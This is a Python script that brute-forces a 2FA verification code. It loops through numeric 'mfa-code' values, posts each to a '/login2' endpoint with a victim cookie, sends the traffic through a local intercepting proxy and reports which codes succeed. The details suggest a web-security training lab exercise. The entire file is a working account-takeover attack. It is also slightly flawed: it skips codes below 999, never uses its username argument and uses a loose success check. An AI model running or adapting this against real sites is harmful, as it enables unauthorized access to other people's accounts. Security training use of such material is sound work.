import requests
import sys
import urllib3
import time
# this takes long time , we need to change it to multi threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080",
}

def brute_force_otp(url:str,username:str):
    otp_url = url + '/login2'
    headers = {"Cookie":"verify=carlos"}
    for i in range(999,9999):
        payload = str(i)
        params = {"mfa-code":payload}

        response = requests.post(otp_url,verify=False,data=params , headers=headers, proxies=proxies)
        if response.is_redirect:
            print(f"(+) This OTP Worked {payload}")
            
        if response.status_code != 200:
            print(f"(+) This OTP Worked {payload}")
            




def main():
    if len(sys.argv) !=3:
        print(f"(-) Usage {sys.argv[0]} http://example.com/ victim_username")
        sys.exit(-1)

    url = sys.argv[1]
    username = sys.argv[2]
    brute_force_otp(url,username)

if __name__ =="__main__":
    
    main()